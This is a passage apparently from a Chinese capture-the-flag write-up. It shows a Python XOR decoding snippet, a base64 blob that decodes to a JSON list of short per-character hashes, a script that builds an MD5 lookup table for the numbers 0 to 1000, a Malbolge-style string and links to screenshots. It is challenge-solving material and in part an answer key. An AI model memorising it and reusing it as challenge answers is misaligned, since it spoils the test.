tmp = enc[:]
for j in range(56):
    tmp[j] ^= x[j]
print(bytes(tmp))
BV1wm2EY2Egx eyJ2IjozLCJuIjoiZjE0ZyIsInMiOiIiLCJoIjoiZjczZDEyZCIsIm0iOjkwLCJrIjo4MSwibWciOjIwMCwia2ciOjEzMCwibCI6NDMsInNsIjoxLCJmaGwiOlsiMjUyZjEwYyIsImFjYWM4NmMiLCJjYTk3ODExIiwiY2QwYWE5OCIsIjAyMWZiNTkiLCIyYzYyNDIzIiwiNGUwNzQwOCIsIjRlMDc0MDgiLCJjYTk3ODExIiwiMmU3ZDJjMCIsIjZiODZiMjciLCIzZjc5YmI3IiwiNGUwNzQwOCIsIjM5NzNlMDIiLCJkNDczNWUzIiwiNGIyMjc3NyIsIjc5MDI2OTkiLCJlN2Y2YzAxIiwiMzk3M2UwMiIsIjRiMjI3NzciLCI0YjIyNzc3IiwiNmI4NmIyNyIsIjJlN2QyYzAiLCIzOTczZTAyIiwiY2E5NzgxMSIsIjNmNzliYjciLCI0ZTA3NDA4IiwiZDQ3MzVlMyIsIjM5NzNlMDIiLCIzZjc5YmI3IiwiM2Y3OWJiNyIsIjI1MmYxMGMiLCIzZjc5YmI3IiwiNmI4NmIyNyIsIjE4YWMzZTciLCI1ZmVjZWI2IiwiNGUwNzQwOCIsIjE4YWMzZTciLCIxOGFjM2U3IiwiMTk1ODFlMiIsIjNmNzliYjciLCJkMTBiMzZhIiwiMDFiYTQ3MSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNzdhZGZjOSIsImRlN2QxYjciLCI0NGJkN2FlIiwiYmI3MjA4YiIsIjgzODkxZDciLCIyYTBhYjczIiwiZmUxZGNkMyIsIjU1OWFlYWQiLCJmMDMxZWZhIl19
{"v":3,"n":"f14g","s":"","h":"f73d12d","m":90,"k":81,"mg":
200,"kg":
130,"l":43,"sl":1,"fhl":["252f10c","acac86c","ca97811","cd0aa98","021fb59","2c62423","4e07408","4e07408","ca97811","2e7d2c0","6b86b27","3f79bb7","4e07408","3973e02","d4735e3","4b22777","7902699","e7f6c01","3973e02","4b22777","4b22777","6b86b27","2e7d2c0","3973e02","ca97811","3f79bb7","4e07408","d4735e3","3973e02","3f79bb7","3f79bb7","252f10c","3f79bb7","6b86b27","18ac3e7","5feceb6","4e07408","18ac3e7","18ac3e7","19581e2","3f79bb7","d10b36a","01ba471","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","77adfc9","de7d1b7","44bd7ae","bb7208b","83891d7","2a0ab73","fe1dcd3","559aead","f031efa"]}
import hashlib

def calculate_md5(number):
    # 将数字转换为字符串
    num_str = str(number)
    # 创建md5对象
    md5_obj = hashlib.md5()
    # 更新md5对象，传入数字字符串的字节形式
    md5_obj.update(num_str.encode('utf-8'))
    # 获取16进制的md5值
    md5_value = md5_obj.hexdigest()
    return md5_value

# 打开一个文件用于写入
with open('md5_values.txt', 'w') as file:
    # 遍历0到1000，计算每个数字的MD5值并写入文件
    for i in range(1001):
        md5_value = calculate_md5(i)
        file.write(f"{md5_value}n")
D'`_q^K![YG{VDTveRc10qpnJ+*)G!~f1{d@-}v&lt;)9xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@"&gt;76Z:
321U54-21*Non,+*#G'&amp;%$d"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^WUZSwWVUNrRQ3IHGLEiCBAFE&gt;=aA:9&gt;765:
981Uvu-2+O/.nm+$Hi'~}|B"!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:
921U/u3,+*Non&amp;%*)('&amp;}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/10-1729558332.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/4-1729558332.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/6-1729558332.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/9-1729558332.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/0-1729558333.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/6-1729558333.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/6-1729558333.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/3-1729558334.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/4-1729558334.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/2-1729558335.png)